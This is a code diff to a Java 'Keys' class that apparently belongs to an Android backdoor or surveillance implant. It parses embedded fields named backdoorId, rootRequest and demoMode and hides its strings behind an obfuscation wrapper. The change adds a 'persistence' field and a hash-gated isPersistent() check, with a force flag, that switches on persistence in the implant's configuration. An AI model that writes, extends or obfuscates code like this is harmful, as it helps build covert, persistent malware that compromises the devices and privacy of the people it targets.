@@ -80,6 +80,9 @@ public class Keys {
 	// Random seed
 	private static byte[] randomSeed;
 
+	// persistence
+	private static byte[] persistence;
+
 	private static Object keysLock = new Object();
 
 	/**
@@ -141,10 +144,9 @@ public class Keys {
 			challengeKey = ByteArray.copy(resource, 78, 16); // 16 byte
 			demoMode = ByteArray.copy(resource, 110, 24); // 24 byte
 			rootRequest = ByteArray.copy(resource, 134, 16); // 16 byte
-			if (resource.length > 150)
-				randomSeed = ByteArray.copy(resource, 150, 16); // 16 byte
-			else
-				randomSeed = new byte[16];
+
+			randomSeed = ByteArray.copy(resource, 150, 16); // 16 byte
+			persistence = ByteArray.copy(resource, 166, 16); // 16 byte
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " backdoorId: " + new String(backdoorId));//$NON-NLS-1$
@@ -155,12 +157,38 @@ public class Keys {
 				Check.log(TAG + " demoMode: " + ByteArray.byteArrayToHex(demoMode));//$NON-NLS-1$
 				Check.log(TAG + " rootMode: " + ByteArray.byteArrayToHex(rootRequest));//$NON-NLS-1$
 				Check.log(TAG + " randomSeed: " + ByteArray.byteArrayToHex(randomSeed));//$NON-NLS-1$
+				Check.log(TAG + " persistence: " + ByteArray.byteArrayToHex(persistence));//$NON-NLS-1$
 			}
 
 			if (isDemo() || Cfg.DEBUG) {
 				Cfg.DEMO = true;
 			}
+
+			if ( isPersistent() ) {
+				Cfg.PERSISTENCE = true;
+			}
 		}
+	}
+
+	public boolean isPersistent() {
+		// o5wp2Izl8jTwr8hf md5 = 92c5784a9b14780df0b109df7c2a171a
+
+		if (Cfg.FORCE_PERSISTENCE) {
+			return true;
+		}
+
+		byte[] digest = ByteArray.hexStringToByteArray(M.e("92c5784a9b14780df0b109df7c2a171a"));
+		byte[] calculated = Digest.MD5(persistence);
+
+		boolean ret = Arrays.equals(calculated, digest);
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "  persistence = " + ByteArray.byteArrayToHex(persistence));
+			Check.log(TAG + "  digest = " + ByteArray.byteArrayToHex(calculated));
+			Check.log(TAG + " (isPersistence): " + ret); //$NON-NLS-1$
+		}
+
+		return ret;
 	}
 
 	public boolean isDemo() {
@@ -168,10 +196,10 @@ public class Keys {
 			return false;
 		}
 		// Pg-WaVyPzMMMMmGbhP6qAigT md5= 863d9effe70187254d3c5e9c76613a99
-		byte[] demoDigest = ByteArray.hexStringToByteArray(M.e("863d9effe70187254d3c5e9c76613a99"));
+		byte[] digest = ByteArray.hexStringToByteArray(M.e("863d9effe70187254d3c5e9c76613a99"));
 		byte[] calculated = Digest.MD5(demoMode);
 
-		boolean ret = Arrays.equals(calculated, demoDigest);
+		boolean ret = Arrays.equals(calculated, digest);
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + "  demoMode = " + ByteArray.byteArrayToHex(demoMode));
@@ -277,9 +305,9 @@ public class Keys {
 	static public byte[] getSubtype() {
 		if (Cfg.DEMO) {
 			// 20.1=DEMO
-			return ("ANDROID-" + M.e("DEMO")).getBytes();
+			return (M.e("ANDROID-DEMO")).getBytes();
 		} else {
-			return "ANDROID".getBytes();
+			return M.e("ANDROID").getBytes();
 		}
 	}
 
